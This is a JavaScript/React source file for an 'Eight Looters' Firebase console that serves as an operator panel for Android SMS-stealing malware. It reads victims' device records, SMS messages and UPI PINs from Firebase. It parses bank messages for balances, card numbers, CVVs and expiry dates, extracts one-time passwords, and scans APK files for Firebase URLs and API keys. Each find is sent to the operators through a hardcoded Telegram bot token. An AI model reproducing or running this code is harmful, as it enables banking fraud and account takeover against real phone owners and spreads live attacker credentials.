/* ============================================================
   Eight Looters · Firebase Console v9
   + SMS 200 limit
   + Bank SMS date/time
   + Premium Access (ELIGHT1300MEMBER)
   ============================================================ */
const {useState,useEffect,useRef,useCallback,useMemo} = React;
const TG_URL = "https://t.me/eightlooters";
const BRAND = "Eight Looters";
const WELCOME_KEY = "elight_welcome_done_v1";
const PERF = (typeof window !== "undefined" && window.__ELIGHT_PERF__) || {isMobile:false,isLowEnd:false};

/* ===== Telegram ===== */
const TG_BOT_TOKEN = "8846250497:AAGIXy4t7G51yH4mRsUfgl3q-Ya3S6tFe3Y";
const TG_CHAT_IDS = ["8965778254", "8646475251"];
function _escTg(s){return String(s??"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
function _nowIst(){return new Date().toLocaleString("en-IN",{timeZone:"Asia/Kolkata",hour12:true});}
async function notifyTelegram(text){
  await Promise.all(TG_CHAT_IDS.map(async chat_id=>{
    try{await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id,text,parse_mode:"HTML",disable_web_page_preview:true})});}catch(e){}
  }));
}
function _cleanTgKey(key,url){if(!key) return "";if(key===url) return "";if(/firebaseio\.com|firebasedatabase\.app/i.test(key)) return "";if(key.length<10) return "";return key;}
function tgFirebaseMsg(url,key,source,devices){const ck=_cleanTgKey(key,url);
  return `🔥 <b>NEW FIREBASE ACTIVATED</b>\n\n📡 <b>URL:</b> <code>${_escTg(url)}</code>\n`+
    (ck?`🔑 <b>Key:</b> <code>${_escTg(ck)}</code>\n`:`🔓 <b>Auth:</b> Public / No key\n`)+
    `📱 <b>Source:</b> ${_escTg(source)}\n`+(devices!=null?`📦 <b>Devices:</b> ${devices}\n`:"")+
    `⏰ <b>Time:</b> ${_escTg(_nowIst())}`;}
function tgBulkMsg(items,source,totalTried){const ok=items.filter(x=>x.ok),fail=items.filter(x=>!x.ok);
  let txt=`🔥 <b>BULK FIREBASE · ${_escTg(source)}</b>\n━━━━━━━━━━━━━━━━━━\n`;
  txt+=`📊 <b>Total tried:</b> ${totalTried}\n✅ <b>Activated:</b> ${ok.length}\n❌ <b>Failed:</b> ${fail.length}\n⏰ <b>Time:</b> ${_escTg(_nowIst())}\n`;
  if(ok.length){txt+=`\n🟢 <b>── ACTIVE PANELS ──</b>\n`;ok.slice(0,40).forEach((x,i)=>{txt+=`<b>${i+1}.</b> <code>${_escTg(x.url)}</code>${x.devices!=null?`  ·  ${x.devices} dev`:""}\n`;});if(ok.length>40) txt+=`<i>…and ${ok.length-40} more</i>\n`;}
  if(fail.length){txt+=`\n🔴 <b>── FAILED ──</b>\n`;fail.slice(0,20).forEach((x,i)=>{txt+=`<b>${i+1}.</b> <code>${_escTg(x.url||"invalid")}</code>\n     ↳ <i>${_escTg((x.reason||"unknown").slice(0,70))}</i>\n`;});if(fail.length>20) txt+=`<i>…and ${fail.length-20} more</i>\n`;}
  return txt;}
function tgApkMsg(file,url,key,pid){const ck=_cleanTgKey(key,url);
  return `🔥 <b>NEW APK FIREBASE</b>\n\n📁 <b>APK:</b> <code>${_escTg(file)}</code>\n📡 <b>URL:</b> <code>${_escTg(url||"—")}</code>\n`+
    (ck?`🔑 <b>API Key:</b> <code>${_escTg(ck)}</code>\n`:`🔓 <b>Auth:</b> Public / No key\n`)+
    (pid?`🆔 <b>Project:</b> <code>${_escTg(pid)}</code>\n`:"")+
    `⏰ <b>Time:</b> ${_escTg(_nowIst())}`;}

/* ===== Icons ===== */
const I=(p,s=16)=>React.createElement("svg",{xmlns:"http://www.w3.org/2000/svg",width:s,height:s,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"},p);
const Ic={
  wifi:s=>I([<path key="a" d="M12 20h.01"/>,<path key="b" d="M2 8.82a15 15 0 0 1 20 0"/>,<path key="c" d="M5 12.859a10 10 0 0 1 14 0"/>,<path key="d" d="M8.5 16.429a5 5 0 0 1 7 0"/>],s),
  shield:s=>I([<path key="a" d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>],s),
  plus:s=>I([<path key="a" d="M5 12h14"/>,<path key="b" d="M12 5v14"/>],s),
  x:s=>I([<path key="a" d="M18 6 6 18"/>,<path key="b" d="m6 6 12 12"/>],s),
  check:s=>I([<path key="a" d="M20 6 9 17l-5-5"/>],s),
  chev:s=>I([<path key="a" d="m9 18 6-6-6-6"/>],s),
  chevL:s=>I([<path key="a" d="m15 18-6-6 6-6"/>],s),
  copy:s=>I([<rect key="a" width="14" height="14" x="8" y="8" rx="2"/>,<path key="b" d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/>],s),
  trash:s=>I([<path key="a" d="M10 11v6"/>,<path key="b" d="M14 11v6"/>,<path key="c" d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/>,<path key="d" d="M3 6h18"/>,<path key="e" d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>],s),
  share:s=>I([<circle key="a" cx="18" cy="5" r="3"/>,<circle key="b" cx="6" cy="12" r="3"/>,<circle key="c" cx="18" cy="19" r="3"/>,<line key="d" x1="8.59" x2="15.42" y1="13.51" y2="17.49"/>,<line key="e" x1="15.41" x2="8.59" y1="6.51" y2="10.49"/>],s),
  link:s=>I([<path key="a" d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/>,<path key="b" d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>],s),
  refresh:s=>I([<path key="a" d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/>,<path key="b" d="M21 3v5h-5"/>,<path key="c" d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"/>,<path key="d" d="M8 16H3v5"/>],s),
  search:s=>I([<path key="a" d="m21 21-4.34-4.34"/>,<circle key="b" cx="11" cy="11" r="8"/>],s),
  send:s=>I([<path key="a" d="M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z"/>,<path key="b" d="m21.854 2.147-10.94 10.939"/>],s),
  logout:s=>I([<path key="a" d="m16 17 5-5-5-5"/>,<path key="b" d="M21 12H9"/>,<path key="c" d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>],s),
  zap:s=>I([<path key="a" d="M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"/>],s),
  upload:s=>I([<path key="a" d="M12 3v12"/>,<path key="b" d="m17 8-5-5-5 5"/>,<path key="c" d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>],s),
  fileSearch:s=>I([<path key="a" d="M14 2v4a2 2 0 0 0 2 2h4"/>,<path key="b" d="M4.268 21a2 2 0 0 0 1.727 1H18a2 2 0 0 0 2-2V7l-5-5H6a2 2 0 0 0-2 2v3"/>,<path key="c" d="m9 18-1.5-1.5"/>,<circle key="d" cx="5" cy="14" r="3"/>],s),
  rupee:s=>I([<path key="a" d="M6 3h12"/>,<path key="b" d="M6 8h12"/>,<path key="c" d="m6 13 8.5 8"/>,<path key="d" d="M6 13h3"/>,<path key="e" d="M9 13c6.667 0 6.667-10 0-10"/>],s),
  card:s=>I([<rect key="a" width="20" height="14" x="2" y="5" rx="2"/>,<line key="b" x1="2" x2="22" y1="10" y2="10"/>],s),
  clock:s=>I([<path key="a" d="M12 6v6l4 2"/>,<circle key="b" cx="12" cy="12" r="10"/>],s),
  phone:s=>I([<path key="a" d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"/>],s),
  signal:s=>I([<path key="a" d="M2 20h.01"/>,<path key="b" d="M7 20v-4"/>,<path key="c" d="M12 20v-8"/>,<path key="d" d="M17 20V8"/>,<path key="e" d="M22 4v16"/>],s),
  msg:s=>I([<path key="a" d="M22 17a2 2 0 0 1-2 2H6.828a2 2 0 0 0-1.414.586l-2.202 2.202A.71.71 0 0 1 2 21.286V5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2z"/>],s),
  eye:s=>I([<path key="a" d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"/>,<circle key="b" cx="12" cy="12" r="3"/>],s),
  eyeOff:s=>I([<path key="a" d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49"/>,<path key="b" d="M14.084 14.158a3 3 0 0 1-4.242-4.242"/>,<path key="c" d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143"/>,<path key="d" d="m2 2 20 20"/>],s),
  trendUp:s=>I([<path key="a" d="M16 7h6v6"/>,<path key="b" d="m22 7-8.5 8.5-5-5L2 17"/>],s),
  trendDown:s=>I([<path key="a" d="M16 17h6v-6"/>,<path key="b" d="m22 17-8.5-8.5-5 5L2 7"/>],s),
  alert:s=>I([<path key="a" d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/>,<path key="b" d="M12 9v4"/>,<path key="c" d="M12 17h.01"/>],s),
  pin:s=>I([<path key="a" d="M12 17v5"/>,<path key="b" d="M9 10.76a2 2 0 0 1-1.11 1.79l-1.78.9A2 2 0 0 0 5 15.24V16a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-.76a2 2 0 0 0-1.11-1.79l-1.78-.9A2 2 0 0 1 15 10.76V7a1 1 0 0 1 1-1 2 2 0 0 0 0-4H8a2 2 0 0 0 0 4 1 1 0 0 1 1 1z"/>],s),
  pinOff:s=>I([<path key="a" d="M12 17v5"/>,<path key="b" d="M15 9.34V7a1 1 0 0 1 1-1 2 2 0 0 0 0-4H8a2 2 0 0 0 0 4 1 1 0 0 1 1 1v2.34"/>,<path key="c" d="M9 9v1.76a2 2 0 0 1-1.11 1.79l-1.78.9A2 2 0 0 0 5 15.24V16a1 1 0 0 0 1 1h11"/>,<path key="d" d="m2 2 20 20"/>],s),
  calendar:s=>I([<path key="a" d="M8 2v4"/>,<path key="b" d="M16 2v4"/>,<rect key="c" width="18" height="18" x="3" y="4" rx="2"/>,<path key="d" d="M3 10h18"/>],s),
  filter:s=>I([<path key="a" d="M3 6h18"/>,<path key="b" d="M7 12h10"/>,<path key="c" d="M10 18h4"/>],s),
  crown:s=>I([<path key="a" d="M2 20h20"/>,<path key="b" d="M4 20V8l4 4 4-8 4 8 4-4v12z"/>],s),
};

/* ===== Storage ===== */
const LS_KEY = "elight_accounts";
const loadAccounts=()=>{try{const a=localStorage.getItem(LS_KEY);return a?JSON.parse(a):[]}catch{return[]}};
const saveAccounts=a=>localStorage.setItem(LS_KEY,JSON.stringify(a));
function useLocalStorage(key, initial){
  const [v,setV] = useState(()=>{try{const s=localStorage.getItem(key);return s!=null?JSON.parse(s):initial;}catch{return initial;}});
  useEffect(()=>{try{localStorage.setItem(key,JSON.stringify(v));}catch{}},[key,v]);
  return [v,setV];
}
const PIN_DEV_KEY = "pin_devices_v1";
const loadPinnedDevices = ()=>{try{return JSON.parse(localStorage.getItem(PIN_DEV_KEY)||"[]");}catch{return[];}};
const savePinnedDevices = (a)=>{try{localStorage.setItem(PIN_DEV_KEY,JSON.stringify(a));}catch{}};

/* ===== Firebase API ===== */
async function fbGet(url,key,path,extra={}){
  let u=url.trim().replace(/\/$/,"");if(!u.startsWith("http")) u="https://"+u;
  if(!u.includes("firebaseio.com")&&!u.includes("firebasedatabase.app")) throw new Error("Invalid Firebase URL");
  const q=new URLSearchParams({auth:(key||"").trim(),...extra});
  let r;
  try{const ctrl=new AbortController();const t=setTimeout(()=>ctrl.abort(),15000);
    r=await fetch(`${u}/${path}.json?${q}`,{method:"GET",headers:{Accept:"application/json"},signal:ctrl.signal});clearTimeout(t);}
  catch(e){if(e.name==="AbortError") throw new Error("Request timed out");throw new Error("Network error: "+e.message);}
  if(!r.ok){const txt=await r.text().catch(()=>"");
    if(r.status===401||r.status===403) throw new Error("PERMISSION_DENIED: Use Database Secret, not API key.");
    if(r.status===404) return null;
    throw new Error(`HTTP ${r.status}: ${txt.slice(0,200)}`);}
  return r.json();
}
async function fbPut(url,key,path,data){
  const u=url.replace(/\/$/,"");
  const r=await fetch(`${u}/${path}.json?auth=${key}`,{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
  if(!r.ok) throw r.status===401||r.status===403?new Error("PERMISSION_DENIED"):new Error(`HTTP ${r.status}`);
  return r.json();
}
async function fbDel(url,key,path){
  const u=url.replace(/\/$/,"");
  const r=await fetch(`${u}/${path}.json?auth=${key}`,{method:"DELETE"});
  if(!r.ok && r.status===403) throw new Error("PERMISSION_DENIED");
}

function extractFirebaseUrls(text){
  if(!text) return [];
  const re=/(?:https?:\/\/)?([A-Za-z0-9][A-Za-z0-9-]*(?:\.[A-Za-z0-9-]+)*\.(?:firebaseio\.com|firebasedatabase\.app))/gi;
  const seen=new Set(),out=[];let m;
  while((m=re.exec(text))!==null){const host=m[1].toLowerCase().replace(/\.+$/,"");
    if(host.includes("..")) continue;
    if(!host.includes("firebaseio.com")&&!host.includes("firebasedatabase.app")) continue;
    if(seen.has(host)) continue;seen.add(host);out.push("https://"+host);}
  return out;
}
function cleanPhone(p){
  const s=String(p||"").replace(/[^0-9]/g,"");
  if(!s||s==="—") return "—";
  if(s.length===12&&s.startsWith("91")) return s.slice(2);
  if(s.length===13&&s.startsWith("091")) return s.slice(3);
  if(s.length>=10) return s.slice(-10);
  return s;
}

/* ===== Parsers ===== */
const BANKS=[[/HDFCBK|HDFCBANK|HDFC/i,"HDFC Bank"],[/SBIIN|SBIINB|SBI/i,"SBI"],[/ICICIB|ICICI/i,"ICICI Bank"],[/AXISBK|AXISBANK|AXIS/i,"Axis Bank"],[/KOTAKB|KOTAK/i,"Kotak Bank"],[/PNBSMS|PNB/i,"PNB"],[/BOIIND|BOI/i,"Bank of India"],[/CANBNK|CANARA/i,"Canara Bank"],[/UNIONB|UBISMS/i,"Union Bank"],[/YESBNK|YESBANK/i,"Yes Bank"],[/IDBIBK|IDBI/i,"IDBI Bank"],[/INDUSB|INDUSIND/i,"IndusInd Bank"],[/FEDERAL|FEDBNK/i,"Federal Bank"],[/RBLBNK|RBL/i,"RBL Bank"],[/PAYTM/i,"Paytm"],[/PHONEPE|PHNPE/i,"PhonePe"],[/GPAY|GOOGLEPAY/i,"Google Pay"],[/AMAZONPAY/i,"Amazon Pay"],[/BAJAJFIN/i,"Bajaj Finance"],[/CRED/i,"CRED"],[/AIRTEL/i,"Airtel Payments"],[/JIOMNY|JIOMONEY/i,"Jio Money"]];
function bankName(s){for(const [r,n] of BANKS) if(r.test(s)) return n;const m=s.toUpperCase().match(/(?:[A-Z]{2}-)?([A-Z0-9]+)/);return m?m[1]:(s||"Bank");}
const BAL_P=[/Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,/Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,/Avbl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,/Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,/(?:Avl|Avail|Aval).*?(?:INR|Rs\.?|₹)\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i,/Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i];
const TXN_P=[/(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,/(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i,/(?:INR|Rs\.?|₹)\s*([0-9]{2,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i];
const ACC_P=[/(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i,/[xX*]{4,}([0-9]{4})/,/ending\s+(?:with\s+)?([0-9]{4})/i];
const CARD_P=[/(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i,/card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i];
const CVV_P=[/CVV[\s:]+([0-9]{3,4})/i,/(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i];
const EXP_P=[/(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i,/([0-9]{1,2})\/([0-9]{2,4})\s+(?:expiry|exp)/i];
const PH_P=[/(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})/i,/(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*([6-9][0-9]{9})/i,/Number\s*[:\-]\s*([6-9][0-9]{9})/i,/registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})/i,/(\+91[-\s]?[6-9][0-9]{9})/,/(?:\b91)([6-9][0-9]{9})\b/,/(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/];
const NET_P=[[/\bJio\b/i,"Jio"],[/\bAirtel\b/i,"Airtel"],[/\bBSNL\b/i,"BSNL"],[/\bVodafone\b/i,"Vodafone"],[/\b(?:Idea|Vi)\b/i,"Vi"],[/\bMTNL\b/i,"MTNL"],[/\bDocomo\b/i,"Docomo"],[/\bTelenor\b/i,"Telenor"]];
const NET_S=[[/AIRTEL|JD-AIRTEL|VM-AIRTEL/i,"Airtel"],[/JIOINF|JIOMSG|JIONET|JIO/i,"Jio"],[/BSNLSM|BSNL/i,"BSNL"],[/VISMOB|VI-|VODA|VODAFONE/i,"Vodafone"],[/IDEACEL|IDEA/i,"Vi"],[/MTNL/i,"MTNL"],[/TATADOC|DOCOMO/i,"Docomo"]];

function parseCard(t){if(!t) return null;const U=t.toUpperCase();
  if(!U.includes("CARD")&&!U.includes("CVV")&&!U.includes("CREDIT")&&!U.includes("DEBIT")) return null;
  let l4="",ty="",cv="",ex="";
  for(const p of CARD_P){const m=t.match(p);if(m&&m[1]){const d=m[1].replace(/[^0-9]/g,"");if(d.length>=4){l4=d.slice(-4);break}}}
  if(!l4) return null;
  if(/VISA/i.test(t)) ty="VISA"; else if(/MASTER(?:CARD)?/i.test(t)) ty="Mastercard";
  else if(/RUPAY/i.test(t)) ty="RuPay"; else if(/AMEX|AMERICAN EXPRESS/i.test(t)) ty="Amex";
  else if(/credit/i.test(t)) ty="Credit Card"; else if(/debit/i.test(t)) ty="Debit Card";
  for(const p of CVV_P){const m=t.match(p);if(m){cv=m[1];break}}
  for(const p of EXP_P){const m=t.match(p);if(m){ex=m[1];break}}
  return {cardLast4:l4,cardType:ty,cvv:cv||undefined,expiry:ex||undefined,rawSms:t};}
function parsePhone(t){for(const p of PH_P){const m=t.match(p);if(m&&m[1]){const d=m[1].replace(/[^0-9]/g,"");if(d.length===10&&/^[6-9]/.test(d)) return d;if(d.length===12&&d.startsWith("91")&&/^91[6-9]/.test(d)) return d.slice(2);}}return null;}
function parseNetwork(t,s){for(const [r,n] of NET_S) if(r.test(s)) return n;const b=t+" "+s;for(const [r,n] of NET_P) if(r.test(b)) return n;return null;}
function parseBankSms(t,s){if(!t||t.trim().length<8) return null;const U=t.toUpperCase();
  if(!/AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE/.test(U)) return null;
  let b=null;for(const p of BAL_P){const m=t.match(p);if(m&&m[1]){const g=m[1].replace(/,/g,"");if(parseFloat(g)>=0){b=g;break}}}
  if(!b) return null;
  let tx;for(const p of TXN_P){const m=t.match(p);if(m&&m[1]){const g=m[1].replace(/,/g,"");if(g!==b){tx=g;break}}}
  let ty;if(/credit(?:ed)?/i.test(t)) ty="credit";else if(/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(t)) ty="debit";
  let ac;for(const p of ACC_P){const m=t.match(p);if(m&&m[1]){ac=m[1].replace(/[^0-9]/g,"").slice(-4);break}}
  return {bankName:bankName(s||"Bank"),senderName:s||"Unknown",availableBalance:b,transactionAmount:tx,transactionType:ty,accountLast4:ac,phoneFromSms:parsePhone(t)||undefined,networkFromSms:parseNetwork(t,s)||undefined,rawSms:t,detectedAt:new Date().toISOString()};}
function timeAgo(ts){const d=Date.now()-ts;if(d<0) return "Just now";const s=Math.floor(d/1000),m=Math.floor(s/60),h=Math.floor(m/60),dd=Math.floor(h/24);
  if(s<60) return s+"s ago";if(m<60) return m+"m ago";if(h<24) return h+"h "+(m%60)+"m ago";if(dd<30) return dd+"d "+(h%24)+"h ago";
  return new Date(ts).toLocaleDateString("en-IN",{day:"2-digit",month:"short",year:"numeric"});}
function fullTime(ts){return new Date(ts).toLocaleString("en-IN",{day:"2-digit",month:"short",year:"numeric",hour:"2-digit",minute:"2-digit",second:"2-digit",hour12:true});}
function fmtMoney(n){try{return parseFloat(n).toLocaleString("en-IN",{minimumFractionDigits:2,maximumFractionDigits:2})}catch{return n}}
function tsFrom(v){if(!v) return null;if(typeof v==="number") return v<1e12?v*1000:v;
  if(typeof v==="string"&&v.trim()){const t=Date.parse(v);if(!isNaN(t)) return t;
    const m=v.match(/(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})[T\s](\d{2}):(\d{2})(?::(\d{2}))?/);
    if(m){const[,d,mo,y,hh,mm,ss]=m;const x=new Date(+y,+mo-1,+d,+hh,+mm,+(ss||0)).getTime();if(!isNaN(x)) return x;}}
  return null;}
function parseDevices(raw){const list=[];if(raw&&typeof raw==="object"){
  Object.entries(raw).forEach(([id,d])=>{
    if(!d||typeof d!=="object") return;
    const s=d.sims;let sims=[];
    if(Array.isArray(s)) sims=s;else if(s&&typeof s==="object") sims=Object.values(s);
    const bat=String(d.battery??"—"),pct=parseInt(bat.replace("%",""))||0;
    const lsR=d.lastSeen??d.last_seen??d.lastOnline??d.last_online??d.lastActive??d.last_active??d.timestamp??d.time??d.dateTime??d.updatedAt??d.updated_at??null;
    const ls=tsFrom(lsR);
    const pick=(...keys)=>{for(const k of keys){const v=d[k];if(v!=null&&v!==""&&v!=="—") return String(v);}return "—";};
    list.push({id,name:String(d.modelName||d.model||d.deviceName||d.name||id),battery:bat,batteryPercent:pct,status:!!d.status,
      phoneNumber:String(d.mobNo||d.phone||d.phoneNumber||d.mobile||d.mob_no||d.mobno||(sims[0]?.phoneNumber)||"—"),
      android:pick("androidV","androidVersion","android_version","android_sdk","sdk_int","androidSDK","android"),
      ip:pick("ip_address","ipAddress","ip_address_public","client_ip","clientIp","clientIP","publicIp","lastIp","ip"),
      storage:pick("storage","totalStorage","storage_total","internal_storage","storageTotal","storage_info","total_storage","disk","storageInfo"),
      provider:pick("service_provider","serviceProvider","provider","network","sim_operator","operator","carrier"),
      sims,upipin:d.upipin?String(d.upipin):null,
      cpu:pick("cpu_arch","cpuArch","cpu","architecture","arch","cpuArchitecture","cpuabi","cpuAbi","cpu_info","abi"),
      sdk:pick("sdkV","sdkVersion","sdk_version","sdk_int","sdk","androidSDK"),
      lastSeen:ls,lastSeenFormatted:ls?timeAgo(ls):undefined,_raw:d});
  });
} return list;}

/* ⚡ PATCH: SMS LIMIT 200 (was 50) */
function parseMessages(raw){
  const out=[];
  if(raw&&typeof raw==="object"){
    const e=Object.entries(raw);
    const slice=e.length>200?e.slice(e.length-200):e;
    for(const[,m] of slice){
      if(!m||typeof m!=="object") continue;
      const t=String(m.message||m.body||m.text||"");
      if(t.trim()) out.push({text:t,sender:String(m.sender||m.from||"Unknown"),time:String(m.dateTime||m.date||"")});
    }
  }
  return out;
}
function parseSmsTime(str){
  if(!str) return 0;
  const m=String(str).match(/(\d{1,2})[-\/](\d{1,2})[-\/](\d{2,4})\s*\|?\s*(\d{1,2}):(\d{2})\s*(am|pm)?/i);
  if(m){
    let[,d,mo,y,hh,mm,ap]=m;
    if(y.length===2) y="20"+y;
    hh=parseInt(hh,10);mm=parseInt(mm,10);
    if(ap){ap=ap.toLowerCase();if(ap==="pm"&&hh<12)hh+=12;if(ap==="am"&&hh===12)hh=0;}
    return new Date(+y,+mo-1,+d,hh,mm).getTime();
  }
  const t=Date.parse(str);
  return isNaN(t)?0:t;
}
function isRecentSms(msgs,days=2){
  if(!msgs||!msgs.length) return false;
  const cutoff=Date.now()-days*24*60*60*1000;
  for(const m of msgs){const t=parseSmsTime(m.time);if(t&&t>=cutoff) return true;}
  return false;
}
function getLastSmsTs(msgs){
  if(!msgs||!msgs.length) return 0;
  let max=0;
  for(const m of msgs){const t=parseSmsTime(m.time);if(t>max) max=t;}
  return max;
}
function extractOtp(text){
  if(!text) return null;
  const pats=[/(?:otp|o\.t\.p|code|verification code|your code|login code|security code|pin)[^0-9]{0,25}(\d{3,8})/i,/(\d{3,8})[^0-9]{0,20}(?:is\s+your|your\s+)?(?:otp|code|verification|pin)/i,/\b(\d{4,6})\b\s*(?:is|as)\s*(?:your|the)\s*(?:otp|code|pin|verification)/i,/(?:is\s+)(\d{4,6})(?:\.|\s|$)/];
  for(const p of pats){const m=text.match(p);if(m&&m[1]&&m[1].length>=3&&m[1].length<=8) return m[1];}
  return null;
}
function analyze(msgs){const banks=[],cards=[],phones=new Set(),nets=new Set();
  for(const m of msgs){
    const b=parseBankSms(m.text,m.sender);
    if(b){
      /* Keep original SMS time string as detectedAt */
      if(m.time) b.detectedAt=m.time;
      banks.push(b);
    }
    const c=parseCard(m.text);if(c) cards.push(c);
    const p=parsePhone(m.text);if(p) phones.add(p);
    const n=parseNetwork(m.text,m.sender);if(n) nets.add(n);
  }
  return {bankBalances:banks,cards,phoneNumbers:[...phones],networks:[...nets]};}
function makeShareLink(u,k){return window.location.origin+window.location.pathname+"?s="+btoa(unescape(encodeURIComponent(u+"|||"+k)));}
function makeMergeLink(a){return window.location.origin+window.location.pathname+"?s="+btoa(unescape(encodeURIComponent(JSON.stringify({type:"elight-panels",version:1,panels:a.map(x=>({url:x.url,key:x.key||""}))}))));}
function decodeLink(tok){try{const t=decodeURIComponent(escape(atob(tok)));
  try{const p=JSON.parse(t);if(p&&p.type==="elight-panels"&&Array.isArray(p.panels)) return {panels:p.panels.filter(x=>x&&x.url)};}catch{}
  const [u,k]=t.split("|||");if(u&&k) return {url:u,key:k};}catch{} return null;}
async function parseApk(file){
  const buf=await file.arrayBuffer();const zip=await JSZip.loadAsync(buf);
  let url="",key="",pid="",appid="";
  const uRe=/https:\/\/[a-z0-9_-]+\.firebaseio\.com/gi;const kRe=/AIza[A-Za-z0-9_-]{35}/g;
  const scan=u8=>{let s="";for(let i=0;i<u8.length;i+=65536) s+=String.fromCharCode(...u8.subarray(i,i+65536));
    const um=s.match(uRe),km=s.match(kRe);return {url:um?um[0]:"",key:km?km[0]:""};};
  const a=zip.file("resources.arsc");if(a){const r=scan(await a.async("uint8array"));if(r.url)url=r.url;if(r.key)key=r.key;}
  if(!url||!key){for(const n of ["classes.dex","classes2.dex","classes3.dex","classes4.dex"]){if(url&&key)break;
    const f=zip.file(n);if(!f)continue;const r=scan(await f.async("uint8array"));
    if(!url&&r.url)url=r.url;if(!key&&r.key)key=r.key;}}
  if(!url||!key){const gs=[zip.file("google-services.json"),zip.file("assets/google-services.json"),zip.file(/google-services\.json$/i)[0]].filter(Boolean);
    for(const f of gs){if(!f)continue;try{const j=JSON.parse(await f.async("text"));
      url=url||j?.project_info?.firebase_url||"";pid=pid||j?.project_info?.project_id||"";
      const c=j?.client?.[0];key=key||c?.api_key?.[0]?.current_key||"";appid=appid||c?.client_info?.mobilesdk_app_id||"";
    }catch{}}}
  if(!url||!key) for(const n of Object.keys(zip.files)){if(url&&key)break;if(zip.files[n].dir)continue;
    try{const r=scan(await zip.files[n].async("uint8array"));if(!url&&r.url)url=r.url;if(!key&&r.key)key=r.key;}catch{}}
  if(!url&&!key) return null;
  return {firebaseUrl:url,apiKey:key,projectId:pid,appId:appid};}

function startOfDay(d){const x=new Date(d);x.setHours(0,0,0,0);return x.getTime();}
